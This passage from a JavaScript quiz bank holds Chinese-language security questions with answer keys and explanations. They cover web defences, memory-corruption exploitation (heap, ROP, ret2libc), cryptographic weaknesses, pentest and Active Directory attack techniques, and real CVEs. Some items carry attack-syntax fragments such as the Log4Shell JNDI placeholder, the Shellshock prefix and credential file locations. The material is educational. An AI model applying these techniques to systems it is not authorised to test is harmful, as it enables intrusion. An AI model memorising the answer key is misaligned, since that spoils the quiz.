  { id:"xw40", cat:"web", level:"中级", q:"凭证填充(credential stuffing)防御？", options:["设备指纹/限速/2FA/异常检测","只用密码","明文存储","关闭 HTTPS"], answer:0, explain:"用已泄露账密批量尝试登录，需用设备/行为特征、限速与 2FA 对抗。" },
  { id:"xw41", cat:"web", level:"中级", q:"缓存投毒(cache poisoning)依赖？", options:["未规范化的输入被用作缓存键 + 未校验的响应","HTTPS","CSRF","XSS"], answer:0, explain:"若不可信输入进入缓存键且响应未校验，攻击者可让缓存向其他用户返回恶意内容。" },
  { id:"xw42", cat:"web", level:"中级", q:"CSP 中 nonce/hash 的作用是？", options:["允许特定内联脚本执行同时保留策略","禁用 JS","加密","加速"], answer:0, explain:"nonce/hash 让受信内联脚本可运行，同时仍禁止其他内联脚本，兼顾功能与安全。" },
  { id:"xw43", cat:"web", level:"中级", q:"防 XSS 的“输出编码”应按？", options:["统一转义","按输出上下文(HTML/JS/URL/属性)分别编码","只转义 <","只转义引号"], answer:1, explain:"不同上下文需不同编码规则，错误上下文编码会漏防或被绕过。" },
  { id:"xw44", cat:"web", level:"中级", q:"OAuth 授权码流程用 PKCE 主要防止？", options:["授权码拦截后被人拿去兑换令牌","CSRF","XSS","暴力破解密码"], answer:0, explain:"PKCE 用一次性挑战值绑定授权码与请求方，防止授权码被截获冒用。" },
  { id:"xw45", cat:"web", level:"中级", q:"刷新令牌(refresh token)泄露后果？", options:["仅影响本次会话","攻击者可长期获取新访问令牌","无影响","仅泄露用户名"], answer:1, explain:"刷新令牌有效期长，泄露意味着持续可用，应妥善存储并支持吊销。" },
  // ---- 二进制 · 入门 ----
  { id:"xb1", cat:"binary", level:"入门", q:"栈溢出的根本原因是？", options:["缺少边界检查写入超出缓冲区","编译器错误","CPU 故障","网络延迟"], answer:0, explain:"向定长缓冲区写入超过其容量的数据会覆盖相邻栈内容（含返回地址）。" },
  { id:"xb2", cat:"binary", level:"入门", q:"格式化字符串漏洞中 %x 用于？", options:["写入","读取栈上数据(泄露)","执行","删除"], answer:1, explain:"%x 按格式从栈上取并打印数据，可泄露栈内存；%n 才可写入。" },
  { id:"xb3", cat:"binary", level:"入门", q:"NX/DEP 的作用是？", options:["数据页不可执行，阻止在堆/栈执行 shellcode","随机化地址","加密","限速"], answer:0, explain:"NX 让数据区域不可执行，使传统“写 shellcode 再跳过去”失效，催生 ROP。" },
  { id:"xb4", cat:"binary", level:"入门", q:"ASLR 的作用是？", options:["随机化内存地址布局，增加预测难度","禁用执行","加密","压缩"], answer:0, explain:"每次加载基址随机，攻击者在无信息泄露时难以预测函数/库地址。" },
  { id:"xb5", cat:"binary", level:"入门", q:"栈 Canary 的作用是？", options:["检测栈溢出是否覆盖了返回地址(哨兵值)","加速","加密","压缩"], answer:0, explain:"在返回地址前放随机哨兵，函数返回前检查被改则中止，防返回地址被覆盖。" },
  { id:"xb6", cat:"binary", level:"入门", q:"PIE 指？", options:["代码基址随机化(位置无关可执行)","数据加密","禁用执行","堆随机"], answer:0, explain:"PIE 让代码段基址也随机化，与 ASLR 配合提升利用难度。" },
  { id:"xb7", cat:"binary", level:"入门", q:"RELRO(FULL)的作用是？", options:["使 GOT 重定位后只读，防 GOT 覆盖","加密","随机化","压缩"], answer:0, explain:"FULL RELRO 在启动时完成重定位并把 GOT 设为只读，阻止改写函数指针。" },
  { id:"xb8", cat:"binary", level:"入门", q:"条件竞争(TOCTOU)常见在？", options:["检查与使用之间的时间窗口","网络","加密","编译"], answer:0, explain:"先检查权限/状态，再使用时已被另一线程改变，造成越权或绕过。" },
  // ---- 二进制 · 初级 ----
  { id:"xb9", cat:"binary", level:"初级", q:"堆溢出常覆写？", options:["堆块元数据(size/fd/bk)实现任意写","栈返回地址","寄存器","内核"], answer:0, explain:"堆块头含 size 与前后向指针，覆写它们可制造任意地址写，是堆利用核心。" },
  { id:"xb10", cat:"binary", level:"初级", q:"Use-After-Free(UAF)指？", options:["释放后未置空又被使用，可能复用已分配块","未分配","重复分配","内存泄漏"], answer:0, explain:"释放后指针未清空，再次使用可能操作被重新分配的同块内存，造成类型混淆/劫持。" },
  { id:"xb11", cat:"binary", level:"初级", q:"double free 指？", options:["多次 free 同一指针，破坏堆结构","一次 free","未 free","栈溢出"], answer:0, explain:"重复释放同一块会让空闲链表出现重复节点，进而可被用于任意写。" },
  { id:"xb12", cat:"binary", level:"初级", q:"ROP(返回导向编程)用于绕过？", options:["NX:复用已存在代码片段(gadget)拼出逻辑","ASLR","Canary","PIE"], answer:0, explain:"NX 下不能执行注入代码，ROP 改借程序中已有的 ret 结尾小片段串起攻击逻辑。" },
  { id:"xb13", cat:"binary", level:"初级", q:"ret2libc 通常调用？", options:["system(\"/bin/sh\") 等 libc 函数拿 shell","printf","exit","main"], answer:0, explain:"在禁用执行的环境下，跳到 libc 的 system 并布置 /bin/sh 参数即可得 shell。" },
  { id:"xb14", cat:"binary", level:"初级", q:"GOT 覆盖利用前提是？", options:["GOT 可写(非 FULL RELRO)时改写函数指针劫持控制流","ASLR","Canary","PIE"], answer:0, explain:"部分 RELRO 下 GOT 仍可写，覆写某函数项即可在调用它时跳到攻击者地址。" },
  { id:"xb15", cat:"binary", level:"初级", q:"整数溢出可能导致？", options:["分配大小计算错误进而堆溢出/越界","网络慢","编译错误","加密弱"], answer:0, explain:"长度运算环绕为小值，使分配偏小，后续拷贝越界写坏堆元数据。" },
  { id:"xb16", cat:"binary", level:"初级", q:"off-by-one 是？", options:["边界差一写入导致单字节越界","整块越界","未初始化","空指针"], answer:0, explain:"差一错误常只越界一字节，却足以改相邻堆块的 size 或 Canary 低位。" },
  { id:"xb17", cat:"binary", level:"初级", q:"shellcode 要成功执行通常需要？", options:["可写且可执行的页(NX 下更难)","仅可写","仅可读","仅网络"], answer:0, explain:"NX 下数据页不可执行，需配合内存权限修改或 ROP 才能运行注入代码。" },
  { id:"xb18", cat:"binary", level:"初级", q:"NOP sled 的作用是？", options:["增大命中 shellcode 入口的容错区间","加密","压缩","加速"], answer:0, explain:"一串 NOP 让跳转落在其任意位置都能滑到真正的 shellcode，降低定位精度要求。" },
  // ---- 二进制 · 中级 ----
  { id:"xb19", cat:"binary", level:"中级", q:"checksec 工具可查看？", options:["Canary/NX/PIE/RELRO 等保护","网络","日志","密码"], answer:0, explain:"checksec 汇总二进制开启的缓解措施，是漏洞利用前的第一步侦察。" },
  { id:"xb20", cat:"binary", level:"中级", q:"ROP 中 gadget 指？", options:["以 ret 结尾的短指令序列，用于拼装逻辑","漏洞","shellcode","堆块"], answer:0, explain:"gadget 是程序中已有的小指令段，多个串联即可在不写可执行代码的前提下完成攻击。" },
  { id:"xb21", cat:"binary", level:"中级", q:"seccomp 是？", options:["限制进程可用 syscall 的系统过滤器(沙箱)","加密","随机化","压缩"], answer:0, explain:"seccomp 收窄进程系统调用面，即使被攻破也难做敏感操作，是沙箱基础。" },
  { id:"xb22", cat:"binary", level:"中级", q:"glibc tcache 因是单链表，使得？", options:["UAF/double free 更易被利用","更慢","更安全","加密"], answer:0, explain:"tcache 缺少充分的一致性校验，UAF/double free 在它上面更易转化为任意写。" },
  { id:"xb23", cat:"binary", level:"中级", q:"栈溢出利用需要先确定？", options:["返回地址相对缓冲区的偏移(offset)","网络端口","密码","文件名"], answer:0, explain:"只有知道从缓冲区到返回地址的填充长度，才能精确覆盖返回地址跳到目标。" },
  { id:"xb24", cat:"binary", level:"中级", q:"信息泄露(如泄露 libc 地址)对 ROP 的意义？", options:["可计算基址绕过 ASLR 调用 gadget","无意义","加速网络","加密"], answer:0, explain:"ASLR 随机化基址，泄露一个 libc 地址就能算出 system 等函数真实地址。" },
  { id:"xb25", cat:"binary", level:"中级", q:"类型混淆(type confusion)常导致？", options:["把对象当另一类型解释，造成越界/UAF 类利用","编译错误","网络","加密"], answer:0, explain:"类型信息被破坏后，对同一块内存按错误结构解读，可越界读写或触发 UAF。" },
  { id:"xb26", cat:"binary", level:"中级", q:"fastbin dup 是？", options:["堆利用技术：利用 double free 在 fastbin 制造重复块","网络","加密","编译"], answer:0, explain:"借助 fastbin 的重复释放制造两个指向同块的指针，进而控制空闲链表。" },
  { id:"xb27", cat:"binary", level:"中级", q:"unlink 是？", options:["经典堆利用：通过伪造 chunk 元数据在空闲时写任意地址","XSS","CSRF","SQLi"], answer:0, explain:"unlink 合并相邻空闲块时会写相邻指针，伪造元数据即可任意地址写。" },
  { id:"xb28", cat:"binary", level:"中级", q:"栈 canary 若被泄露(如格式化字符串)会？", options:["失效，溢出可不被发现","更安全","加密","加速"], answer:0, explain:"canary 一旦被读出，攻击者可在溢出时原样填回，使检测失效。" },
  // ---- 密码学 · 入门 ----
  { id:"xc1", cat:"crypto", level:"入门", q:"DES 的主要缺陷？", options:["56 位密钥过短，已被 brute-force","太快","分组太大","需要 IV"], answer:0, explain:"DES 仅 56 位密钥，现代算力可穷举，已不安全的。" },
  { id:"xc2", cat:"crypto", level:"入门", q:"3DES 现状？", options:["有效 112 位、慢、新系统不推荐","最安全","无需密钥","无 IV"], answer:0, explain:"3DES 有效强度约 112 位且性能差，NIST 已逐步弃用，新系统用 AES。" },
  { id:"xc3", cat:"crypto", level:"入门", q:"AES 支持的分组长度是？", options:["128 位","64 位","256 位(仅)","512 位"], answer:0, explain:"AES 固定 128 位分组；密钥才分 128/192/256。" },
  { id:"xc4", cat:"crypto", level:"入门", q:"AES 密钥长度可选？", options:["128/192/256 位","仅 128","仅 56","仅 64"], answer:0, explain:"AES 支持三种密钥长度，均为安全强度足够的选项。" },
  { id:"xc5", cat:"crypto", level:"入门", q:"MD5 现况？", options:["已被攻破(可造碰撞)，不用于安全签名/校验","仍安全","最快","需密钥"], answer:0, explain:"MD5 碰撞已可 practical 构造，不能用于数字签名等安全场景。" },
  { id:"xc6", cat:"crypto", level:"入门", q:"SHA-1 现况？", options:["已可构造碰撞，弃用","最安全","需 IV","对称"], answer:0, explain:"SHA-1 碰撞已被证实，证书与签名场景应升级到 SHA-256 及以上。" },
  { id:"xc7", cat:"crypto", level:"入门", q:"数字签名用？", options:["私钥签名、公钥验证","对称密钥","哈希即可","无密钥"], answer:0, explain:"签名由私钥产生、公钥验证，提供来源认证与不可否认。" },
  { id:"xc8", cat:"crypto", level:"入门", q:"MAC 与数字签名区别在于？", options:["MAC 基于对称密钥、双方共享；签名用非对称且可公开验证","无区别","MAC 用公钥","签名用对称"], answer:0, explain:"MAC 的验证方也持有同一密钥，无法向第三方证明；签名可公开验证。" },
  { id:"xc9", cat:"crypto", level:"入门", q:"口令存储应加 salt 是为了？", options:["防彩虹表、使相同口令密文不同","加速","缩短","加密传输"], answer:0, explain:"随机 salt 让相同口令产生不同哈希，并使预计算彩虹表失效。" },
  { id:"xc10", cat:"crypto", level:"入门", q:"存储口令推荐？", options:["bcrypt/Argon2/scrypt 等慢哈希+盐","MD5 单次","明文","Base64"], answer:0, explain:"慢哈希拖慢暴力/字典攻击，加盐防彩虹表，是当前最佳实践。" },
  { id:"xc11", cat:"crypto", level:"入门", q:"生成令牌/密钥应使用？", options:["CSPRNG(如 /dev/urandom)","rand()","时间种子","PID"], answer:0, explain:"密码学安全随机数不可预测，rand()/时间/pid 都可被猜解。" },
  // ---- 密码学 · 初级 ----
  { id:"xc12", cat:"crypto", level:"初级", q:"ECB 模式问题？", options:["相同明文块→相同密文块，泄露结构","需 IV","最快","最安全"], answer:0, explain:"ECB 无随机化，相同明文块产生相同密文块，会暴露图像/数据模式。" },
  { id:"xc13", cat:"crypto", level:"初级", q:"CBC 模式 IV 应？", options:["随机且不可预测","固定为 0","公开明文","省略"], answer:0, explain:"IV 必须随机不可预测，否则相同明文首块会暴露关联。" },
  { id:"xc14", cat:"crypto", level:"初级", q:"CBC 填充预言(padding oracle)可？", options:["通过填充校验差异解密密文","提速","压缩","加密"], answer:0, explain:"若服务对填充错误返回不同响应，攻击者可逐字节恢复明文，无需密钥。" },
  { id:"xc15", cat:"crypto", level:"初级", q:"CTR/GCM 的 nonce 绝对不能重用，否则？", options:["可恢复明文甚至伪造(灾难性)","无影响","更安全","加速"], answer:0, explain:"流密码式 nonce 重用会让同一密钥流异或，直接泄露明文并可伪造。" },
  { id:"xc16", cat:"crypto", level:"初级", q:"RC4 现状？", options:["存在统计偏置，已不安全","最安全","需 IV","对称最好"], answer:0, explain:"RC4 密钥流有可 exploited 的偏置，已被淘汰，不应再使用。" },
  { id:"xc17", cat:"crypto", level:"初级", q:"RSA 小公钥指数 e=3 且仅用裸加密小消息会被？", options:["直接开立方根恢复明文(需适当填充)","提速","压缩","加密"], answer:0, explain:"小 e 且无填充时，密文可能本身就是明文的小幂次，开根即得明文。" },
  { id:"xc18", cat:"crypto", level:"初级", q:"RSA 应使用哪种填充？", options:["OAEP(PKCS#1 v2)","无填充(Textbook)","PKCS#1 v1.5(易 BLEICHEN)","自定义 XOR"], answer:0, explain:"OAEP 提供语义安全；v1.5 有 BLEICHEN 等攻击，教科书式无填充更危险。" },
  { id:"xc19", cat:"crypto", level:"初级", q:"两 RSA 模数共享一个素因子时，可？", options:["求 GCD 分解两模数","提速","压缩","加密"], answer:0, explain:"共享一个素数则两模数 GCD 即该素数，进而分解出私钥。" },
  { id:"xc20", cat:"crypto", level:"初级", q:"前向保密(forward secrecy)指？", options:["会话密钥不依赖长期私钥，泄露长期密钥也不能解密旧会话","更快","无密钥","对称"], answer:0, explain:"每次会话用临时密钥，长期私钥泄露也无法解密既往通信内容。" },
  { id:"xc21", cat:"crypto", level:"初级", q:"HMAC 是？", options:["基于哈希的消息认证码","对称加密","数字签名","随机数"], answer:0, explain:"HMAC 用密钥与哈希构造 MAC，提供完整性+认证，且抗长度扩展。" },
  { id:"xc22", cat:"crypto", level:"初级", q:"长度扩展攻击影响？", options:["Merkle-Damgård 哈希(MD5/SHA1/SHA2)，HMAC 免疫","AES","RSA","ECC"], answer:0, explain:"M-D 结构允许在已知哈希后追加数据并算出新哈希；HMAC 通过嵌套结构免疫。" },
  // ---- 密码学 · 中级 ----
  { id:"xc23", cat:"crypto", level:"中级", q:"TLS 的 Heartbleed 是？", options:["OpenSSL 心跳扩展越界读，泄露内存","加密弱","降级","MITM"], answer:0, explain:"心跳请求未校验长度，可读取进程内存，泄露私钥与会话数据。" },
  { id:"xc24", cat:"crypto", level:"中级", q:"POODLE 攻击针对？", options:["强制降级到 SSLv3 利用 CBC 弱点","AES","RSA","ECC"], answer:0, explain:"POODLE 诱使客户端用已不安全的 SSLv3，再利用 CBC 处理缺陷解密字节。" },
  { id:"xc25", cat:"crypto", level:"中级", q:"ECDSA 若随机数 k 重用会？", options:["可恢复私钥","提速","压缩","加密"], answer:0, explain:"同一 k 签两份不同消息会联立方程解出私钥，是真实重大事故根源。" },
  { id:"xc26", cat:"crypto", level:"中级", q:"DHE/ECDHE 提供？", options:["临时密钥交换，支持前向保密","对称加密","静态密钥","无密钥"], answer:0, explain:"临时(Ephemeral)密钥每次协商新密钥，实现前向保密。" },
  { id:"xc27", cat:"crypto", level:"中级", q:"证书固定(cert pinning)用途？", options:["绑定预期公钥/证书，防伪造 CA 中间人","加速","压缩","加密 cookie"], answer:0, explain:"pinning 只信任预定证书/公钥，即使被植入恶意 CA 也无法中间人。" },
  { id:"xc28", cat:"crypto", level:"中级", q:"RSA 私钥 d 过小时可用？", options:["Wiener 攻击恢复私钥","提速","压缩","加密"], answer:0, explain:"d 过小（与 N 相比）时连分数攻击可恢复私钥，应使用足够大的 d。" },
  { id:"xc29", cat:"crypto", level:"中级", q:"TLS 中间人成功常因？", options:["证书校验缺失/被禁或伪造 CA 被信任","HTTPS","HSTS","pinning"], answer:0, explain:"只要客户端不严格校验证书或信任了攻击者 CA，就能透明中间人解密。" },
  { id:"xc30", cat:"crypto", level:"中级", q:"对称加密 vs 非对称加密，非对称主要缺点？", options:["运算慢、适合小数据/密钥交换","不需要密钥","最安全","最快"], answer:0, explain:"非对称运算开销大，通常用于协商对称密钥或签名，而非大量数据加密。" },
  // ---- 渗透测试 · 入门 ----
  { id:"xp1", cat:"pentest", level:"入门", q:"被动侦察指？", options:["不接触目标(WHOIS/证书透明/搜索引擎缓存)","端口扫描","漏洞利用","提权"], answer:0, explain:"被动侦察尽量不触碰目标，降低被发现与封禁风险。" },
  { id:"xp2", cat:"pentest", level:"入门", q:"主动侦察指？", options:["直接扫描/探测目标(可能留下痕迹)","只查公开资料","社工","报告"], answer:0, explain:"主动侦察会向目标发流量（扫描/探测），效率高但有痕迹。" },
  { id:"xp3", cat:"pentest", level:"入门", q:"nmap -sS 是？", options:["SYN 半开扫描","全连接","UDP","版本"], answer:0, explain:"-sS 只完成三次握手前两步便重置，隐蔽且快，是最常用扫描方式。" },
  { id:"xp4", cat:"pentest", level:"入门", q:"nmap -sV 用于？", options:["探测服务/版本","操作系统","只 ping","清理"], answer:0, explain:"-sV 主动探测 banner 以识别服务类型与版本，辅助匹配漏洞。" },
  { id:"xp5", cat:"pentest", level:"入门", q:"目录爆破(gobuster/ffuf)用于？", options:["发现隐藏路径/文件","加密","提权","报告"], answer:0, explain:"用字典枚举路径，常能找到后台、备份、接口等未链接资产。" },
  { id:"xp6", cat:"pentest", level:"入门", q:"子域枚举常用？", options:["字典/证书透明(DNS)/搜索引擎","仅 ping","仅 nmap","仅社工"], answer:0, explain:"证书透明日志、DNS 字典与搜索引擎是子域发现的常用手段。" },
  { id:"xp7", cat:"pentest", level:"入门", q:"漏洞扫描器(Nessus/OpenVAS)应在？", options:["明确授权范围内使用","任意目标","生产无告知","公网随意"], answer:0, explain:"未经授权的扫描可能违法或影响业务，必须在书面授权范围内进行。" },
  { id:"xp8", cat:"pentest", level:"入门", q:"渗透测试方法论顺序通常？", options:["侦察→扫描→利用→提权→持久化→报告","报告→利用→侦察","只利用","只扫描"], answer:0, explain:"标准流程从信息收集到利用再到后渗透与交付报告，循序渐进。" },
  { id:"xp9", cat:"pentest", level:"入门", q:"CVSS 用于？", options:["量化漏洞严重程度/评分","加密","扫描","提权"], answer:0, explain:"CVSS 用向量给出 0-10 的基线分，便于统一排优先级。" },
  { id:"xp10", cat:"pentest", level:"入门", q:"MITRE ATT&CK 是？", options:["攻防战术与技术知识库","扫描器","加密","操作系统"], answer:0, explain:"ATT&CK 整理真实对抗中的战术/技术，常用于红蓝映射与检测建设。" },
  // ---- 渗透测试 · 初级 ----
  { id:"xp11", cat:"pentest", level:"初级", q:"Linux 提权常见途径？", options:["sudo 配置错误/SUID/ cron/内核漏洞","换浏览器","重装","关防火墙"], answer:0, explain:"滥用错误 sudo 规则、SUID 二进制、定时任务与内核漏洞是常见提权点。" },
  { id:"xp12", cat:"pentest", level:"初级", q:"Windows 提权常见途径？", options:["未引号路径服务/令牌 impersonation/ GPP 密码","换桌面","重装","关杀软"], answer:0, explain:"不当服务路径、令牌模拟与组策略首选项里存的密码都是经典提权面。" },
  { id:"xp13", cat:"pentest", level:"初级", q:"Pass-the-Hash 指？", options:["用 NTLM 哈希直接认证，无需明文密码","重装","换 IP","加密"], answer:0, explain:"Windows 认证用哈希而非明文，拿到哈希即可直接认证，无需破解。" },
  { id:"xp14", cat:"pentest", level:"初级", q:"Kerberoasting 指？", options:["请求服务票据离线爆破服务账户口令","换密码","提权内核","扫描"], answer:0, explain:"攻击者请求服务票据，其可用服务账户弱口令离线爆破，得到域内权限。" },
  { id:"xp15", cat:"pentest", level:"初级", q:"横向移动常用？", options:["SMB/PsExec/ Pass-the-Hash/ WMI","重装","关机","报告"], answer:0, explain:"在内网用共享/远程管理协议与哈希复用，从一台主机移动到另一台。" },
  { id:"xp16", cat:"pentest", level:"初级", q:"凭证获取 Linux 看？", options:["/etc/shadow、进程内存、配置中的明文","只有浏览器","注册表","BIOS"], answer:0, explain:"口令哈希在 /etc/shadow，运行中进程与配置文件也可能泄露明文凭据。" },
  { id:"xp17", cat:"pentest", level:"初级", q:"黄金票据(Golden Ticket)利用？", options:["krbtgt 哈希伪造任意 TGT 长期控域","换密码","扫描","提权内核"], answer:0, explain:"掌握 krbtgt 密钥即可签发任意用户的 TGT，实现域控持久化。" },
  { id:"xp18", cat:"pentest", level:"初级", q:"钓鱼(phishing)属于？", options:["社会工程，诱导目标执行/泄露","扫描","加密","内核"], answer:0, explain:"钓鱼利用心理与信任诱使目标点击/提供凭证，是社会工程典型手段。" },
  { id:"xp19", cat:"pentest", level:"初级", q:"C2(命令与控制)框架如？", options:["Cobalt Strike/Metasploit(授权内)","浏览器","编辑器","防火墙"], answer:0, explain:"C2 框架用于在被控主机与攻击端间建立受控通道，须在授权范围内使用。" },
  { id:"xp20", cat:"pentest", level:"初级", q:"红队与蓝队区别？", options:["红队攻、蓝队防，对抗式演练","都是防守","都是扫描","都是报告"], answer:0, explain:"红队模拟攻击者，蓝队防守检测响应，联合演练提升真实防护能力。" },
  // ---- 渗透测试 · 中级 ----
  { id:"xp21", cat:"pentest", level:"中级", q:"威胁狩猎(threat hunting)指？", options:["主动在环境中寻找已绕过防御的威胁","被动等告警","扫描外网","加密"], answer:0, explain:"狩猎假设防御已被绕过，主动用数据与情报揪出潜伏威胁。" },
  { id:"xp22", cat:"pentest", level:"中级", q:"SIEM 用途？", options:["集中日志与安全事件关联分析","加密","扫描","提权"], answer:0, explain:"SIEM 汇聚多源日志并做关联，帮助发现横向移动等攻击链。" },
  { id:"xp23", cat:"pentest", level:"中级", q:"域渗透中 BloodHound 用于？", options:["可视化 AD 权限关系，找最短提权路径","扫描端口","加密","报告"], answer:0, explain:"BloodHound 以图展示 AD 对象关系，快速定位到域管的攻击路径。" },
  { id:"xp24", cat:"pentest", level:"中级", q:"渗透报告应包含？", options:["风险等级/复现步骤/影响/修复建议","只给分数","只给密码","只给 IP"], answer:0, explain:"好报告要让客户能复现并修复，需含严重度、证据、影响与整改建议。" },
  { id:"xp25", cat:"pentest", level:"中级", q:"范围界定(scoping)重要性？", options:["明确授权边界，避免越权/违法","加快","加密","扫描"], answer:0, explain:"清晰的范围与授权是合法测试前提，越界可能构成违法或影响业务。" },
  { id:"xp26", cat:"pentest", level:"中级", q:"社会工程手法包括？", options:["pretexting/ baiting/ 钓鱼 等","端口扫描","加密","内核"], answer:0, explain:"社会工程靠人为弱点而非技术漏洞，包含伪装、诱饵、钓鱼等。" },
  { id:"xp27", cat:"pentest", level:"中级", q:"物理安全测试包括？", options:["尾随/USB drop/门禁测试","只扫 Web","只加密","只报告"], answer:0, explain:"物理层面也是攻击面，尾随进门、丢 U 盘等可突破逻辑防线。" },
  { id:"xp28", cat:"pentest", level:"中级", q:"漏洞验证(PoC)与利用区别？", options:["PoC 证明存在且不造成破坏，利用可能深入","一样","PoC 更危险","利用更安全"], answer:0, explain:"PoC 仅需证明可行性并尽量不破坏系统，正式利用才会进一步深入。" },
  { id:"xp29", cat:"pentest", level:"中级", q:"WAF 属于？", options:["防御层，过滤恶意 Web 流量","攻击工具","扫描器","加密"], answer:0, explain:"WAF 在应用前过滤恶意请求，是 Web 防护的重要一层（非万能）。" },
    { id:"xp30", cat:"pentest", level:"中级", q:"日志分析可发现？", options:["异常登录/横向移动痕迹","加密","扫描端口","内核版本"], answer:0, explain:"登录时间异常、非常见源 IP 的横向连接等是入侵在日志中的典型信号。" },

  // ===================== 高级(CTF)档位：真实 CVE 分析 / 综合利用链 / CTF 专项 =====================
  // ---- 高级 · 真实 CVE 漏洞分析 ----
  { id:"av1", cat:"crypto", level:"高级", q:"CVE-2014-0160（Heartbleed）的漏洞本质是？", options:["OpenSSL TLS 心跳扩展未校验长度导致越界读内存","SSH 弱口令","SQL 注入","XSS"], answer:0, explain:"心跳请求声称的长度大于实际负载，服务端按声称长度回显，越界读取进程内存（含私钥）。", hint:"关注“声称的长度”与实际负载长度不一致。" },
  { id:"av2", cat:"web", level:"高级", q:"Shellshock（CVE-2014-6271）的触发面是？", options:["Bash 环境变量中以 `() {` 开头却仍执行尾随命令","内核提权","浏览器漏洞","DNS 投毒"], answer:0, explain:"CGI 等会把 HTTP 头写入环境变量再交给 bash，尾随命令被当作函数体执行，造成 RCE。", hint:"CGI 脚本会把 HTTP 头塞进环境变量传给 bash。" },
  { id:"av3", cat:"binary", level:"高级", q:"Dirty COW（CVE-2016-5195）属于？", options:["Linux 内核写时复制(COW)竞态导致的本地提权","远程 RCE","XSS","密码学缺陷"], answer:0, explain:"竞态让只读映射被写成可写，攻击者可改 /etc/passwd 等拿到 root。", hint:"目标是写原本只读的系统文件。" },
  { id:"av4", cat:"binary", level:"高级", q:"EternalBlue（MS17-010）利用的组件是？", options:["Windows SMBv1 的漏洞","OpenSSL","Apache","Nginx"], answer:0, explain:"SMBv1 处理畸形报文时的漏洞，可被用于远程代码执行，WannaCry 即借其传播。", hint:"与 WannaCry 勒索蠕虫同源。" },
  { id:"av5", cat:"binary", level:"高级", q:"BlueKeep（CVE-2019-0708）的显著特征是？", options:["RDP 预认证远程代码执行","需登录后才能触发","仅信息泄露","SQL 注入"], answer:0, explain:"无需账号即可在 RDP 预认证阶段触发 RCE，危害类似 WannaCry 级蠕虫。", hint:"无需账号即可触发。" },
  { id:"av6", cat:"web", level:"高级", q:"Log4Shell（CVE-2021-44228）的触发点是？", options:["Log4j 2 的 JNDI 查找 `${jndi:ldap://...}` 解析不可信日志","SSH 配置错误","DNS 污染","XSS"], answer:0, explain:"任何被记录的不可信字符串里的 JNDI 占位符都会被解析，从远程加载类实现 RCE。", hint:"日志内容里出现该占位符就会被解析。" },
  { id:"av7", cat:"web", level:"高级", q:"Spring4Shell（CVE-2022-22965）的利用关键在？", options:["通过数据绑定访问 getClass().classLoader 修改 Tomcat 写入 webshell","SQL 注入","XSS","CSRF"], answer:0, explain:"Spring Bean 的数据绑定越过了对象边界，可借 classLoader 写文件实现 RCE。", hint:"数据绑定越过了对象属性边界。" },
  { id:"av8", cat:"web", level:"高级", q:"Drupalgeddon2（CVE-2018-7600）属于？", options:["Drupal 请求参数处理导致的远程代码执行","XSS","CSRF","SQL 注入"], answer:0, explain:"未过滤的数组/属性被当作命令执行，攻击者可直接 RCE。", hint:"与“未过滤的数组/属性被当作命令执行”有关。" },
  { id:"av9", cat:"web", level:"高级", q:"Struts2 S2-045（CVE-2017-5638）的根因是？", options:["Jakarta Multipart 解析器的 OGNL 表达式注入","CSRF","XSS","SSRF"], answer:0, explain:"上传/错误页处理时执行了攻击者可控的 OGNL 表达式，导致 RCE。", hint:"错误页处理执行了可控的 OGNL。" },
  { id:"av10", cat:"binary", level:"高级", q:"Spectre（CVE-2017-5715/5753）利用的是？", options:["CPU 投机执行(speculative execution)侧信道越权读内存","磁盘加密缺陷","SQL 注入","XSS"], answer:0, explain:"错误的投机执行路径会留下缓存痕迹，借此跨进程读敏感内存。", hint:"错误的投机执行会留下缓存痕迹。" },
  { id:"av11", cat:"binary", level:"高级", q:"Meltdown（CVE-2017-5754）与 Spectre 主要区别？", options:["直接跨越内核/用户态边界读内核内存","只影响浏览器","仅网络层","XSS"], answer:0, explain:"Meltdown 利用权限检查被推迟，用户态可直接读内核内存，需 KPTI 缓解。", hint:"需 KPTI/隔离页表缓解。" },
  { id:"av12", cat:"pentest", level:"高级", q:"Zerologon（CVE-2020-1472）针对？", options:["Netlogon 协议，用全零 client credential 绕过认证接管域控","OpenSSL","Apache","SSH"], answer:0, explain:"Netlogon 认证对全零 IV 的 AES-CFB8 可被绕过，攻击者可重置域控机器账户密码。", hint:"与 AES-CFB8 IV 全零相关的认证绕过。" },
  { id:"av13", cat:"pentest", level:"高级", q:"PrintNightmare（CVE-2021-34527）利用的是？", options:["Windows 打印后台处理程序 RPRN RPC 未授权提权/RCE","浏览器漏洞","DNS 投毒","SQL 注入"], answer:0, explain:"通过 RPC 添加打印机驱动加载 DLL，实现提权与远程代码执行。", hint:"通过 RPC 添加打印机驱动加载 DLL。" },
  { id:"av14", cat:"web", level:"高级", q:"ProxyLogon（CVE-2021-26855）链的起点通常是？", options:["Exchange 预认证 SSRF 抵达内部服务再序列化 RCE","钓鱼邮件","XSS","CSRF"], answer:0, explain:"先用 SSRF 绕过认证访问内部接口，再借序列化等拿到 RCE。", hint:"先“绕过认证”访问内部接口。" },
  { id:"av15", cat:"crypto", level:"高级", q:"POODLE（CVE-2014-3566）迫使客户端降级到？", options:["SSLv3 再利用其 CBC 处理弱点","TLS1.3","AES-GCM","RSA"], answer:0, explain:"降级到 SSLv3 后利用 CBC 实现缺陷逐字节恢复明文。", hint:"旧协议 CBC 实现存在可攻击点。" },
  { id:"av16", cat:"crypto", level:"高级", q:"FREAK（CVE-2015-0204）利用的是？", options:["可降级到出口级(export-grade)弱 RSA 密钥协商","Heartbeat","XSS","DNS 污染"], answer:0, explain:"中间人让服务端使用短密钥，随后可离线分解恢复会话密钥。", hint:"中间人让服务端用弱密钥。" },
  { id:"av17", cat:"crypto", level:"高级", q:"ROBOT（CVE-2017-6168 等）是？", options:["RSA PKCS#1 v1.5 填充的计时/报错预言机攻击","AES 侧信道","XSS","SQL 注入"], answer:0, explain:"利用解密“预言机”（响应差异）辅助恢复明文或签名。", hint:"解密“预言机”可辅助解密。" },
  { id:"av18", cat:"web", level:"高级", q:"Log4Shell 的最佳修复思路是？", options:["升级 Log4j2 并禁用 JNDI 远程查找/格式消息","仅关日志","更换数据库密码","仅靠 WAF 即可"], answer:0, explain:"根因在 JNDI 查找，应升级并关闭远程查找；WAF 只能拦已知 payload，不解决根因。", hint:"WAF 只拦已知 payload，根因在 JNDI 查找。" },
  // ---- 高级 · 综合利用链(exploit chain) ----
